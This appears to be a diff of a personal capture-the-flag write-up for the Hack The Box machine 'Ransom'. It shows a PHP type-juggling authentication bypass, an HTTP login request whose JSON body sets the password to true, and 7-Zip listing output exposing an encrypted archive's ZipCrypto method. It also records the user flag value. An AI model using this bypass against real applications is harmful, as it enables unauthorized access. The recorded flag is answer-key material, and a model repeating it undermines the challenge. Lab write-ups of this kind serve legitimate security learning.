@@ -34,10 +34,16 @@ Cookie: XSRF-TOKEN=eyJpdiI6Im9zRXJmTDJMbG1EZW1iT0IxcG5tV2c9PSIsInZhbHVlIjoiU3phY
 
 ````
 
+  
+
+
+  
+# User
+  
 There is a [Type Juggling == vs ===](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) vulnerability in the application that can be exploited.
 
 The application allows GET and HEAD method but also allows JSON on body, changing the password to TRUE (or 0) would make the internal comparision on php match.
-  
+
 ````http
 GET /api/login HTTP/1.1
 Host: ransom.htb
@@ -55,12 +61,52 @@ Content-Length: 18
 { "password":true}
 ````
 
+The web page has the first flag
+http://ransom.htb/user.txt
 
+And also has a zip archive (http://ransom.htb/uploaded-file-3422.zip)
+
+7zip/7-zip has a technical mode to show more information from a file that can be used to discover the criptography used to cipher the archive.
+
+````
+# 7z l -slt uploaded-file-3422.zip 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 7735 bytes (8 KiB)
+
+Listing archive: uploaded-file-3422.zip
+
+--
+Path = uploaded-file-3422.zip
+Type = zip
+Physical Size = 7735
+
+----------
+Path = .bash_logout
+Folder = -
+Size = 220
+Packed Size = 170
+Modified = 2020-02-25 08:03:22
+Created = 
+Accessed = 
+Attributes = _ -rw-r--r--
+Encrypted = +
+Comment = 
+CRC = 6CE3189B
+Method = ZipCrypto Deflate
+Host OS = Unix
+Version = 20
+Volume Index = 0
+````
   
-# User
-
 # Root
 
 # Secrets
+  
+  * FLAG_USER = 34b36fdef7651ea726d6dd00d83678cb
+  * FLAG_ROOT = 
   
 https://0xdf.gitlab.io/2022/03/15/htb-ransom.html
